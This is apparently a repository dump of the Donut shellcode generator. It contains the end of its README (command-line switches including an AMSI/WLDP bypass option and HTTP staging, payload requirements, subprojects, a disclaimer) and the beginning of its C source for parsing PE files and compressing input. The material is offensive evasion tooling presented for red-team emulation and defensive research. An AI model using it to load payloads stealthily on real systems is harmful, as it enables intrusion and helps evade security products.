available.</p>\n\n<ul>\n  <li><a href=\"https://github.com/n1xbyte/donutCS\">C# generator by n1xbyte</a></li>\n  <li><a href=\"https://github.com/Binject/go-donut\">Go generator by awgh</a></li>\n</ul>\n\n<h2 id=\"usage\">4. Usage</h2>\n\n<p>The following table lists switches supported by the command line version of the generator.</p>\n\n<table border=\"1\">\n  <tr>\n    <th>Switch</th>\n    <th>Argument</th>\n    <th>Description</th>\n  </tr>\n  \n  <tr>\n    <td><strong>-a</strong></td>\n    <td><var>arch</var></td>\n    <td>Target architecture for loader : 1=x86, 2=amd64, 3=x86+amd64(default).</td>\n  </tr>\n  \n  <tr>\n    <td><strong>-b</strong></td>\n    <td><var>level</var></td>\n    <td>Behavior for bypassing AMSI/WLDP : 1=None, 2=Abort on fail, 3=Continue on fail.(default)</td>\n  </tr>\n\n  <tr>\n    <td><strong>-k</strong></td>\n    <td><var>headers</var></td>\n    <td>Preserve PE headers. 1=Overwrite (default), 2=Keep all</td>\n  </tr>\n\n  <tr>\n    <td><strong>-j</strong></td>\n    <td><var>decoy</var></td>\n    <td>Optional path of decoy module for Module Overloading.</td>\n  </tr>\n  \n  <tr>\n    <td><strong>-c</strong></td>\n    <td><var>class</var></td>\n    <td>Optional class name. (required for .NET DLL) Can also include namespace: e.g <em>namespace.class</em></td>\n  </tr>  \n  \n  <tr>\n    <td><strong>-d</strong></td>\n    <td><var>name</var></td>\n    <td>AppDomain name to create for .NET. If entropy is enabled, one will be generated randomly.</td>\n  </tr>  \n\n  <tr>\n    <td><strong>-e</strong></td>\n    <td><var>level</var></td>\n    <td>Entropy level. 1=None, 2=Generate random names, 3=Generate random names + use symmetric encryption (default)</td>\n  </tr>\n  \n  <tr>\n    <td><strong>-f</strong></td>\n    <td><var>format</var></td>\n    <td>The output format of loader saved to file. 1=Binary (default), 2=Base64, 3=C, 4=Ruby, 5=Python, 6=PowerShell, 7=C#, 8=Hexadecimal</td>\n  </tr>\n  \n  <tr>\n    <td><strong>-m</strong></td>\n    <td><var>name</var></td>\n    <td>Optional method or function for DLL. (a method is required for .NET DLL)</td>\n  </tr>\n  \n  <tr>\n    <td><strong>-n</strong></td>\n    <td><var>name</var></td>\n    <td>Module name for HTTP staging. If entropy is enabled, one is generated randomly.</td>\n  </tr>\n  \n  <tr>\n    <td><strong>-o</strong></td>\n    <td><var>path</var></td>\n    <td>Specifies where Donut should save the loader. Default is \"loader.bin\" in the current directory.</td>\n  </tr>\n\n  <tr>\n    <td><strong>-p</strong></td>\n    <td><var>parameters</var></td>\n    <td>Optional parameters/command line inside quotations for DLL method/function or EXE.</td>\n  </tr>\n  \n  <tr>\n    <td><strong>-r</strong></td>\n    <td><var>version</var></td>\n    <td>CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.</td>\n  </tr>\n  \n  <tr>\n    <td><strong>-s</strong></td>\n    <td><var>server</var></td>\n    <td>URL for the HTTP server that will host a Donut module. Credentials may be provided in the following format: <pre>https://username:password@192.168.0.1/</pre></td>\n  </tr>\n\n  <tr>\n    <td><strong>-t</strong></td>\n    <td></td>\n    <td>Run the entrypoint of an unmanaged/native EXE as a thread and wait for thread to end.</td>\n  </tr>\n  \n  <tr>\n    <td><strong>-w</strong></td>\n    <td></td>\n    <td>Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)</td>\n  </tr>\n  \n  <tr>\n    <td><strong>-x</strong></td>\n    <td><var>option</var></td>\n    <td>Determines how the loader should exit. 1=exit thread (default), 2=exit process, 3=Do not exit or cleanup and block indefinitely</td>\n  </tr>\n\n  <tr>\n    <td><strong>-y</strong></td>\n    <td><var>addr</var></td>\n    <td>Creates a new thread for the loader and continues execution at an address that is an offset relative to the host process's executable. The value provided is the offset. This option supports loaders that wish to resume execution of the host process after donut completes execution.</td>\n  </tr>\n\n  <tr>\n    <td><strong>-z</strong></td>\n    <td><var>engine</var></td>\n    <td>Pack/Compress the input file. 1=None, 2=aPLib, 3=LZNT1, 4=Xpress, 5=Xpress Huffman. Currently, the last three are only supported on Windows.</td>\n  </tr>\n</table>\n\n<h3 id=\"requirements\">Payload Requirements</h2>\n\n<p>There are some specific requirements that your payload must meet in order for Donut to successfully load it.</p>\n\n<h3 id=\"requirements-dotnet\">.NET Assemblies</h2>\n\n<ul>\n  <li>The entry point method must only take strings as arguments, or take no arguments.</li>\n  <li>The entry point method must be marked as public and static.</li>\n  <li>The class containing the entry point method must be marked as public.</li>\n  <li>The Assembly must NOT be a Mixed Assembly (contain both managed and native code).</li>\n  <li>As such, the Assembly must NOT contain any Unmanaged Exports.</li>\n</ul>\n\n<h3 id=\"requirements-native\">Native EXE/DLL</h2>\n\n<ul>\n  <li>Binaries built with Cygwin are unsupported.</li>\n</ul>\n\n<p>Cygwin executables use initialization routines that expect the host process to be running from disk. If executing from memory, the host process will likely crash.</p>\n\n<h3 id=\"requirements-dotnet\">Unmanaged DLLs</h2>\n\n<ul>\n  <li>A user-specified entry point method must only take a string as an argument, or take no arguments. We have provided an <a href=\"https://github.com/TheWover/donut/blob/master/DonutTest/dlltest.c/\">example</a>.</li>\n</ul>\n\n<h2 id=\"subproj\">5. Subprojects</h2>\n\n<p>There are four companion projects provided with donut:</p>\n\n<table border=\"1\">\n  <tr>\n    <th>Tool</th>\n    <th>Description</th>\n  </tr>\n  <tr>\n    <td>DemoCreateProcess</td>\n    <td>A sample .NET Assembly to use in testing. Takes two command-line parameters that each specify a program to execute.</td>\n  </tr>\n  <tr>\n    <td>DonutTest</td>\n    <td>A simple C# shellcode injector to use in testing donut. The shellcode must be base64 encoded and copied in as a string.</td>\n  </tr>\n  <tr>\n    <td>ModuleMonitor</td>\n    <td>A proof-of-concept tool that detects CLR injection as it is done by tools such as Donut and Cobalt Strike's execute-assembly.</td>\n  </tr>\n  <tr>\n    <td>ProcessManager</td>\n    <td>A Process Discovery tool that offensive operators may use to determine what to inject into and defensive operators may use to determine what is running, what properties those processes have, and whether or not they have the CLR loaded. </td>\n  </tr>\n</table>\n\n<h2 id=\"dev\">6. Developing with Donut</h2>\n\n<p>You may want to add support for more types of payloads, change our feature set, or integrate Donut into your existing tooling. We have provided <a href=\"https://github.com/TheWover/donut/blob/master/docs/devnotes.md\">developer documentation</a>. Additional features are left as exercises to the reader. Our suggestions:</p>\n\n<ul>\n  <li>Add environmental keying.</li>\n  <li>Make Donut polymorphic by obfuscating the loader every time shellcode is generated.</li>\n  <li>Integrate Donut as a module into your favorite RAT/C2 Framework.</li>\n</ul>\n\n<h2 id=\"qad\">7. Questions and Discussion</h2>\n\n<p>If you have any questions or comments about Donut. Join the #Donut channel in the <a href=\"https://bloodhoundgang.herokuapp.com/\">BloodHound Gang Slack</a></p>\n\n<h2 id=\"disclaimer\">8. Disclaimer</h2>\n\n<p>We are not responsible for any misuse of this software or technique. Donut is provided as a demonstration of CLR Injection and in-memory loading through shellcode in order to provide red teamers a way to emulate adversaries and defenders a frame of reference for building analytics and mitigations. This inevitably runs the risk of malware authors and threat actors misusing it. However, we believe that the net benefit outweighs the risk. Hopefully that is correct. In the event EDR or AV products are capable of detecting Donut via signatures or behavioral patterns, we will not update Donut to counter signatures or detection methods. To avoid being offended, please do not ask.</p>\n"
        },
        {
          "name": "docs",
          "type": "tree",
          "content": null
        },
        {
          "name": "donut.c",
          "type": "blob",
          "size": 75.009765625,
          "content": "/**\n  BSD 3-Clause License\n\n  Copyright (c) 2019-2020, TheWover, Odzhan. All rights reserved.\n\n  Redistribution and use in source and binary forms, with or without\n  modification, are permitted provided that the following conditions are met:\n\n  * Redistributions of source code must retain the above copyright notice, this\n    list of conditions and the following disclaimer.\n\n  * Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n  * Neither the name of the copyright holder nor the names of its\n    contributors may be used to endorse or promote products derived from\n    this software without specific prior written permission.\n\n  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\n  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n\n#include \"donut.h\"\n\n#include \"loader_exe_x86.h\"\n#include \"loader_exe_x64.h\"\n  \n#define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }\n#define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }\n#define PUT_WORD(p, v)     { t=v; memcpy((char*)p, (char*)&t, 4); p = (uint8_t*)p + 4; }\n#define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }\n \n// required for each API used by the loader\n#define DLL_NAMES \"ole32;oleaut32;wininet;mscoree;shell32\"\n \n// These must be in the same order as the DONUT_INSTANCE structure defined in donut.h\nstatic API_IMPORT api_imports[] = { \n  {KERNEL32_DLL, \"LoadLibraryA\"},\n  {KERNEL32_DLL, \"GetProcAddress\"},\n  {KERNEL32_DLL, \"GetModuleHandleA\"},\n  {KERNEL32_DLL, \"VirtualAlloc\"},\n  {KERNEL32_DLL, \"VirtualFree\"},\n  {KERNEL32_DLL, \"VirtualQuery\"},\n  {KERNEL32_DLL, \"VirtualProtect\"},\n  {KERNEL32_DLL, \"Sleep\"},\n  {KERNEL32_DLL, \"MultiByteToWideChar\"},\n  {KERNEL32_DLL, \"GetUserDefaultLCID\"},\n  {KERNEL32_DLL, \"WaitForSingleObject\"},\n  {KERNEL32_DLL, \"CreateThread\"},\n  {KERNEL32_DLL, \"CreateFileA\"},\n  {KERNEL32_DLL, \"GetFileSizeEx\"},\n  {KERNEL32_DLL, \"GetThreadContext\"},\n  {KERNEL32_DLL, \"GetCurrentThread\"},\n  {KERNEL32_DLL, \"GetCurrentProcess\"},\n  {KERNEL32_DLL, \"GetCommandLineA\"},\n  {KERNEL32_DLL, \"GetCommandLineW\"},\n  {KERNEL32_DLL, \"HeapAlloc\"},\n  {KERNEL32_DLL, \"HeapReAlloc\"},\n  {KERNEL32_DLL, \"GetProcessHeap\"},\n  {KERNEL32_DLL, \"HeapFree\"},\n  {KERNEL32_DLL, \"GetLastError\"},\n  {KERNEL32_DLL, \"CloseHandle\"},\n        \n  {SHELL32_DLL,  \"CommandLineToArgvW\"},\n  \n  {OLEAUT32_DLL, \"SafeArrayCreate\"},\n  {OLEAUT32_DLL, \"SafeArrayCreateVector\"},\n  {OLEAUT32_DLL, \"SafeArrayPutElement\"},\n  {OLEAUT32_DLL, \"SafeArrayDestroy\"},\n  {OLEAUT32_DLL, \"SafeArrayGetLBound\"},\n  {OLEAUT32_DLL, \"SafeArrayGetUBound\"},\n  {OLEAUT32_DLL, \"SysAllocString\"},\n  {OLEAUT32_DLL, \"SysFreeString\"},\n  {OLEAUT32_DLL, \"LoadTypeLib\"},\n  \n  {WININET_DLL,  \"InternetCrackUrlA\"},\n  {WININET_DLL,  \"InternetOpenA\"},\n  {WININET_DLL,  \"InternetConnectA\"},\n  {WININET_DLL,  \"InternetSetOptionA\"},\n  {WININET_DLL,  \"InternetReadFile\"},\n  {WININET_DLL,  \"InternetQueryDataAvailable\"},\n  {WININET_DLL,  \"InternetCloseHandle\"},\n  {WININET_DLL,  \"HttpOpenRequestA\"},\n  {WININET_DLL,  \"HttpSendRequestA\"},\n  {WININET_DLL,  \"HttpQueryInfoA\"},\n  \n  {MSCOREE_DLL,  \"CorBindToRuntime\"},\n  {MSCOREE_DLL,  \"CLRCreateInstance\"},\n  \n  {OLE32_DLL,    \"CoInitializeEx\"},\n  {OLE32_DLL,    \"CoCreateInstance\"},\n  {OLE32_DLL,    \"CoUninitialize\"},\n\n  {NTDLL_DLL,    \"RtlEqualUnicodeString\"},\n  {NTDLL_DLL,    \"RtlEqualString\"},\n  {NTDLL_DLL,    \"RtlUnicodeStringToAnsiString\"},\n  {NTDLL_DLL,    \"RtlInitUnicodeString\"},\n  {NTDLL_DLL,    \"RtlExitUserThread\"},\n  {NTDLL_DLL,    \"RtlExitUserProcess\"},\n  {NTDLL_DLL,    \"RtlCreateUnicodeString\"},\n  {NTDLL_DLL,    \"RtlGetCompressionWorkSpaceSize\"},\n  {NTDLL_DLL,    \"RtlDecompressBuffer\"},\n  {NTDLL_DLL,    \"NtContinue\"},\n  {NTDLL_DLL,    \"NtCreateSection\"},\n  {NTDLL_DLL,    \"NtMapViewOfSection\"},\n  {NTDLL_DLL,    \"NtUnmapViewOfSection\"},\n  //{KERNEL32_DLL, \"AddVectoredExceptionHandler\"},\n  //{KERNEL32_DLL, \"RemoveVectoredExceptionHandler\"},\n  //{NTDLL_DLL,    \"RtlFreeUnicodeString\"},\n  //{NTDLL_DLL,    \"RtlFreeString\"},\n  \n  { NULL, NULL }   // last one always contains two NULL pointers\n};\n\n// required to load .NET assemblies\nstatic GUID xCLSID_CorRuntimeHost = {\n  0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};\n\nstatic GUID xIID_ICorRuntimeHost = {\n  0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};\n\nstatic GUID xCLSID_CLRMetaHost = {\n  0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};\n  \nstatic GUID xIID_ICLRMetaHost = {\n  0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};\n  \nstatic GUID xIID_ICLRRuntimeInfo = {\n  0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};\n\nstatic GUID xIID_AppDomain = {\n  0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13}};\n  \n// required to load VBS and JS files\nstatic GUID xIID_IUnknown = {\n  0x00000000, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};\n\nstatic GUID xIID_IDispatch = {\n  0x00020400, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};\n\nstatic GUID xIID_IHost  = { \n  0x91afbd1b, 0x5feb, 0x43f5, {0xb0, 0x28, 0xe2, 0xca, 0x96, 0x06, 0x17, 0xec}};\n  \nstatic GUID xIID_IActiveScript = {\n  0xbb1a2ae1, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};\n\nstatic GUID xIID_IActiveScriptSite = {\n  0xdb01a1e3, 0xa42b, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};\n\nstatic GUID xIID_IActiveScriptSiteWindow = {\n  0xd10f6761, 0x83e9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};\n  \nstatic GUID xIID_IActiveScriptParse32 = {\n  0xbb1a2ae2, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};\n\nstatic GUID xIID_IActiveScriptParse64 = {\n  0xc7ef7658, 0xe1ee, 0x480e, {0x97, 0xea, 0xd5, 0x2c, 0xb4, 0xd7, 0x6d, 0x17}};\n\nstatic GUID xCLSID_VBScript = {\n  0xB54F3741, 0x5B07, 0x11cf, {0xA4, 0xB0, 0x00, 0xAA, 0x00, 0x4A, 0x55, 0xE8}};\n\nstatic GUID xCLSID_JScript  = {\n  0xF414C260, 0x6AC0, 0x11CF, {0xB6, 0xD1, 0x00, 0xAA, 0x00, 0xBB, 0xBB, 0x58}};\n\n// where to store information about input file\nfile_info fi;\n\n// return pointer to DOS header\nstatic PIMAGE_DOS_HEADER DosHdr(void *map) {\n    return (PIMAGE_DOS_HEADER)map;\n}\n\n// return pointer to NT headers\nstatic PIMAGE_NT_HEADERS NtHdr (void *map) {\n    return (PIMAGE_NT_HEADERS) ((uint8_t*)map + DosHdr(map)->e_lfanew);\n}\n\n// return pointer to File header\nstatic PIMAGE_FILE_HEADER FileHdr (void *map) {\n    return &NtHdr(map)->FileHeader;\n}\n\n// determines CPU architecture of binary\nstatic int is32 (void *map) {\n    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_I386;\n}\n\n// return pointer to Optional header\nstatic void* OptHdr (void *map) {\n    return (void*)&NtHdr(map)->OptionalHeader;\n}\n\nstatic PIMAGE_DATA_DIRECTORY Dirs (void *map) {\n    if (is32(map)) {\n      return ((PIMAGE_OPTIONAL_HEADER32)OptHdr(map))->DataDirectory;\n    } else {\n      return ((PIMAGE_OPTIONAL_HEADER64)OptHdr(map))->DataDirectory;\n    }\n}\n\n// valid dos header?\nstatic int valid_dos_hdr (void *map) {\n    PIMAGE_DOS_HEADER dos = DosHdr(map);\n    \n    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;\n    return (dos->e_lfanew != 0);\n}\n\n// valid nt headers\nstatic int valid_nt_hdr (void *map) {\n    return NtHdr(map)->Signature == IMAGE_NT_SIGNATURE;\n}\n\nstatic ULONG64 rva2ofs (void *base, ULONG64 rva) {\n    DWORD                 i;\n    ULONG64               ofs;\n    PIMAGE_DOS_HEADER     dos;\n    PIMAGE_NT_HEADERS     nt;\n    PIMAGE_SECTION_HEADER sh;\n      \n    dos = (PIMAGE_DOS_HEADER)base;\n    nt  = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);\n    sh  = (PIMAGE_SECTION_HEADER)\n      ((PBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);\n    \n    for (i=0; i<nt->FileHeader.NumberOfSections; i++) {      \n      if ((rva >= sh[i].VirtualAddress) && \n          (rva < (sh[i].VirtualAddress + sh[i].SizeOfRawData))) {\n          \n        ofs = sh[i].PointerToRawData + (rva - sh[i].VirtualAddress);\n        return ofs;\n      }\n    }\n    return -1;\n}\n\n#ifdef WINDOWS\n#include \"mmap-windows.c\"\n#endif\n\n/**\n * Function: map_file\n * ----------------------------\n *   Open and map the contents of file into memory.\n *   \n *   INPUT  : path = file to map\n *       \n *   OUTPUT : Donut error code. \n */\nstatic int map_file(const char *path) {\n    struct stat fs;\n\n    DPRINT(\"Entering.\");\n    \n    if(stat(path, &fs) != 0) {\n      DPRINT(\"Unable to read size of file : %s\", path);\n      return DONUT_ERROR_FILE_NOT_FOUND;\n    }\n    \n    if(fs.st_size == 0) {\n      DPRINT(\"File appears to be empty!\");\n      return DONUT_ERROR_FILE_EMPTY;\n    }\n    \n    fi.fd = open(path, O_RDONLY);\n    \n    if(fi.fd < 0) {\n      DPRINT(\"Unable to open %s for reading.\", path);\n      return DONUT_ERROR_FILE_ACCESS;\n    }\n    \n    fi.len = fs.st_size;\n    \n    fi.data = mmap(NULL, fi.len, PROT_READ, MAP_PRIVATE, fi.fd, 0);\n    \n    // no mapping? close file\n    if(fi.data == NULL) {\n      DPRINT(\"Unable to map file : %s\", path);\n      close(fi.fd);\n      return DONUT_ERROR_NO_MEMORY;\n    }\n    return DONUT_ERROR_OK;\n}\n\n/**\n * Function: unmap_file\n * ----------------------------\n *   Releases memory allocated for file and closes descriptor.\n *\n *   INPUT  : Nothing\n *\n *   OUTPUT : Donut error code\n */\nstatic int unmap_file(void) {\n    \n    if(fi.zdata != NULL) {\n      DPRINT(\"Releasing compressed data.\");\n      free(fi.zdata);\n      fi.zdata = NULL;\n    }\n    if(fi.data != NULL) {\n      DPRINT(\"Unmapping input file.\");\n      munmap(fi.data, fi.len);    \n      fi.data = NULL;\n    }\n    if(fi.fd != 0) {\n      DPRINT(\"Closing input file.\");\n      close(fi.fd);\n      fi.fd = 0;\n    }\n    return DONUT_ERROR_OK;\n}\n\n// only included for executable generator or debug build\n#if defined(DONUT_EXE) || defined(DEBUG)\n/**\n * Function: file_diff\n * ----------------------------\n *   Calculates the ratio between two lengths for compression and decompression.\n *\n *   INPUT  : new_len = new length\n *          : old_len = old length\n *\n *   OUTPUT : ratio as a percentage\n */\nstatic uint32_t file_diff(uint32_t new_len, uint32_t old_len) {\n    if (new_len <= UINT_MAX / 100) {\n      new_len *= 100;\n    } else {\n      old_len /= 100;\n    }\n    if (old_len == 0) {\n      old_len = 1;\n    }\n    return (100 - (new_len / old_len));\n}\n#endif\n\n/**\n * Function: compress_file\n * ----------------------------\n *   Compresses the input file based on engine selected by user\n *\n *   INPUT  : Pointer to Donut configuration.\n *\n *   OUTPUT : Donut error code. \n */\nint compress_file(PDONUT_CONFIG c) {\n    int err = DONUT_ERROR_OK;\n    \n    // RtlCompressBuffer is only available on Windows\n    #ifdef WINDOWS\n    typedef NTSTATUS (WINAPI *RtlGetCompressionWorkSpaceSize_t)(\n      USHORT                 CompressionFormatAndEngine,\n      PULONG                 CompressBufferWorkSpaceSize,\n      PULONG                 CompressFragmentWorkSpaceSize);\n\n    typedef NTSTATUS (WINAPI *RtlCompressBuffer_t)(\n      USHORT                 CompressionFormatAndEngine,\n      PUCHAR                 UncompressedBuffer,\n      ULONG                  UncompressedBufferSize,\n      PUCHAR                 CompressedBuffer,\n      ULONG                  CompressedBufferSize,\n      ULONG                  UncompressedChunkSize,\n      PULONG                 FinalCompressedSize,\n      PVOID                  WorkSpace);\n    \n    ULONG                            wspace, fspace;\n    NTSTATUS                         nts;\n    PVOID                            ws;\n    HMODULE                          m;\n    RtlGetCompressionWorkSpaceSize_t RtlGetCompressionWorkSpaceSize;\n    RtlCompressBuffer_t              RtlCompressBuffer;\n    \n    // compress file using RtlCompressBuffer?\n    if(c->compress == DONUT_COMPRESS_LZNT1  ||\n       c->compress == DONUT_COMPRESS_XPRESS) \n    {\n      m = GetModuleHandle(\"ntdll\");\n      RtlGetCompressionWorkSpaceSize = (RtlGetCompressionWorkSpaceSize_t)GetProcAddress(m, \"RtlGetCompressionWorkSpaceSize\");\n      RtlCompressBuffer = (RtlCompressBuffer_t)GetProcAddress(m, \"RtlCompressBuffer\");\n      \n      if(RtlGetCompressionWorkSpaceSize == NULL || RtlCompressBuffer == NULL) {\n        DPRINT(\"Unable to resolve compression API\");\n        return DONUT_ERROR_COMPRESSION;\n      }\n      \n      DPRINT(\"Reading fragment and workspace size\");\n      nts = RtlGetCompressionWorkSpaceSize(\n        (c->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, \n        &wspace, &fspace);\n        \n      if(nts == 0) {\n        DPRINT(\"workspace size : %\"PRId32\" | fragment size : %\"PRId32, wspace, fspace);\n        ws = malloc(wspace); \n        if(ws != NULL) {\n          DPRINT(\"Allocating memory for compressed data.\");\n          fi.zdata = malloc(fi.len);\n          if(fi.zdata != NULL) {\n            DPRINT(\"Compressing %p to %p with RtlCompressBuffer(%s)\",\n              fi.data, fi.zdata,\n              c->compress == DONUT_COMPRESS_LZNT1  ? \"LZNT\" : \"XPRESS\");\n            \n            nts = RtlCompressBuffer(\n              (c->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, \n              fi.data, fi.len, fi.zdata, fi.len, 0, \n              (PULONG)&fi.zlen, ws); \n            \n            if(nts != 0) {\n              DPRINT(\"NTSTATUS : %lx\", nts);\n              err = DONUT_ERROR_COMPRESSION;\n            }\n          } else err = DONUT_ERROR_NO_MEMORY;\n          free(ws);\n        } else err = DONUT_ERROR_NO_MEMORY;\n      } else err = DONUT_ERROR_COMPRESSION;\n    }\n    #endif\n    if(c->compress == DONUT_COMPRESS_APLIB) {\n      DPRINT(\"Obtaining size of compressed data from aP_max_packed_size() and allocating memory\");\n      fi.zdata = malloc(aP_max_packed_size(fi.len));\n      if(fi.zdata != NULL) {\n        DPRINT(\"Obtaining size of work memory from aP_workmem_size() and allocating memory\");\n        uint8_t *workmem = malloc(aP_workmem_size(fi.len));\n        if(workmem != NULL) {\n          DPRINT(\"Compressing with aP_pack()\");\n          fi.zlen = aP_pack(fi.data, fi.zdata, fi.len, workmem, NULL, NULL);\n        \n          if(fi.zlen == APLIB_ERROR) err = DONUT_ERROR_COMPRESSION;\n          free(workmem);\n        } else err = DONUT_ERROR_NO_MEMORY;\n      } else err = DONUT_ERROR_NO_MEMORY;\n    }\n    \n    // if compression is specified\n    if(err == DONUT_ERROR_OK && c->compress != DONUT_COMPRESS_NONE) {\n      // set the compressed length in configuration\n      c->zlen = fi.zlen;\n      DPRINT(\"Original file size : %\"PRId32 \" | Compressed : %\"PRId32, fi.len, fi.zlen);\n      DPRINT(\"File size reduced by %\"PRId32\"%%\", file_diff(fi.zlen, fi.len));\n    }\n    DPRINT(\"Leaving with error :  %\" PRId32, err);\n    return err;\n}\n\n/**\n * Function: read_file_info\n * ----------------------------\n *   Reads information about the input file.\n *\n *   INPUT  : Pointer to Donut configuration.\n *\n *   OUTPUT : Donut error code.\n */\nstatic int read_file_info(PDONUT_CONFIG c) {\n    PIMAGE_NT_HEADERS                nt;    \n    PIMAGE_DATA_DIRECTORY            dir;\n    PMDSTORAGESIGNATURE              pss;\n    PIMAGE_COR20_HEADER              cor;\n    DWORD                            dll, rva, cpu;\n    ULONG64                          ofs;\n    PCHAR                            ext;\n    int                              err = DONUT_ERROR_OK;\n\n    DPRINT(\"Entering.\");\n    \n    // invalid parameters passed?\n    if(c->input[0] == 0) {\n      DPRINT(\"No input file provided.\");\n      return DONUT_ERROR_INVALID_PARAMETER;\n    }\n\n    DPRINT(\"Checking extension of %s\", c->input);\n    ext = strrchr(c->input, '.');\n    \n    // no extension? exit\n    if(ext == NULL) {\n      DPRINT(\"Input file has no extension.\");\n      return DONUT_ERROR_FILE_INVALID;\n    }\n    DPRINT(\"Extension is \\\"%s\\\"\", ext);\n\n    // VBScript?\n    if (strcasecmp(ext, \".vbs\") == 0) {\n      DPRINT(\"File is VBS\");\n      fi.type = DONUT_MODULE_VBS;\n      fi.arch = DONUT_ARCH_ANY;\n    } else \n    // JScript?\n    if (strcasecmp(ext,  \".js\") == 0) {\n      DPRINT(\"File is JS\");\n      fi.type = DONUT_MODULE_JS;\n      fi.arch = DONUT_ARCH_ANY;\n    } else \n    // EXE?\n    if (strcasecmp(ext, \".exe\") == 0) {\n      DPRINT(\"File is EXE\");\n      fi.type = DONUT_MODULE_EXE;\n    } else\n    // DLL?\n    if (strcasecmp(ext, \".dll\") == 0) {\n      DPRINT(\"File is DLL\");\n      fi.type = DONUT_MODULE_DLL;\n    } else {\n      DPRINT(\"Don't recognize file extension.\");\n      return DONUT_ERROR_FILE_INVALID;\n    }\n    \n    DPRINT(\"Mapping %s into memory\", c->input);\n    \n    err = map_file(c->input);\n    if(err != DONUT_ERROR_OK) return err;\n    \n    // file is EXE or DLL?\n    if(fi.type == DONUT_MODULE_DLL ||\n       fi.type == DONUT_MODULE_EXE)\n    {\n      if(!valid_dos_hdr(fi.data)) {\n        DPRINT(\"EXE/DLL has no valid DOS header.\");\n        err = DONUT_ERROR_FILE_INVALID;\n        goto cleanup;\n      }\n      \n      if(!valid_nt_hdr(fi.data)) {\n        DPRINT(\"EXE/DLL has no valid NT header.\");\n        err = DONUT_ERROR_FILE_INVALID;\n        goto cleanup;\n      }\n\n      dir = Dirs(fi.data);\n      \n      if(dir == NULL) {\n        DPRINT(\"EXE/DLL has no valid image directories.\");\n        err = DONUT_ERROR_FILE_INVALID;\n        goto cleanup;\n      }\n      DPRINT(\"Checking characteristics\");\n      \n      nt  = NtHdr(fi.data);\n      dll = nt->FileHeader.Characteristics & IMAGE_FILE_DLL;\n      cpu = is32(fi.data);\n      rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;\n      \n      // set the CPU architecture for file\n      fi.arch = cpu ? DONUT_ARCH_X86 : DONUT_ARCH_X64;\n      \n      // if COM directory present\n      if(rva != 0) {\n        DPRINT(\"COM Directory found indicates .NET assembly.\");\n        \n        // if it has an export address table, we assume it's a .NET\n        // mixed assembly. curently unsupported by the PE loader.\n        if(dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0) {\n          DPRINT(\"File looks like a mixed (native and managed) assembly.\");\n          err = DONUT_ERROR_MIXED_ASSEMBLY;\n          goto cleanup;\n        } else {\n          // set type to EXE or DLL assembly\n          fi.type = (dll) ? DONUT_MODULE_NET_DLL : DONUT_MODULE_NET_EXE;\n          \n          // try read the runtime version from meta header\n          strncpy(fi.ver, \"v4.0.30319\", DONUT_VER_LEN - 1);\n          \n          ofs = rva2ofs(fi.data, rva);\n          if (ofs != -1) {\n            cor = (PIMAGE_COR20_HEADER)(ofs + fi.data);\n            rva = cor->MetaData.VirtualAddress;\n            if(rva != 0) {\n              ofs = rva2ofs(fi.data, rva);\n              if(ofs != -1) {\n                pss = (PMDSTORAGESIGNATURE)(ofs + 